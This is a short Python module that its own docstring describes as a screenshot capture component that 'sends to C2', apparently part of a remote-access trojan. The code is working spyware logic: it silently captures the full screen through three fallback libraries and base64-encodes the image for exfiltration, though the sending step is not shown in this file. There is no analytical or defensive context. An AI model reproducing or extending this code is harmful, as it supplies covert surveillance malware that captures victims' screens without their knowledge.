#!/usr/bin/env python3
"""
Screenshot capture module
Takes screenshots and sends to C2
"""

import base64
import io

def take_screenshot():
    """Capture screenshot"""
    try:
        # Try multiple methods
        
        # Method 1: mss (fastest)
        try:
            import mss
            with mss.mss() as sct:
                screenshot = sct.grab(sct.monitors[0])
                
                # Convert to bytes
                from PIL import Image
                img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
                
                buffer = io.BytesIO()
                img.save(buffer, format='PNG')
                
                return base64.b64encode(buffer.getvalue()).decode()
                
        except ImportError:
            pass
            
        # Method 2: PIL ImageGrab
        try:
            from PIL import ImageGrab
            
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            
            return base64.b64encode(buffer.getvalue()).decode()
            
        except ImportError:
            pass
            
        # Method 3: pyautogui
        try:
            import pyautogui
            
            screenshot = pyautogui.screenshot()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            
            return base64.b64encode(buffer.getvalue()).decode()
            
        except ImportError:
            pass
            
        return None
        
    except Exception as e:
        return f"Screenshot error: {e}"

if __name__ == "__main__":
    screenshot = take_screenshot()
    if screenshot:
        print(f"Screenshot captured: {len(screenshot)} bytes (base64)")
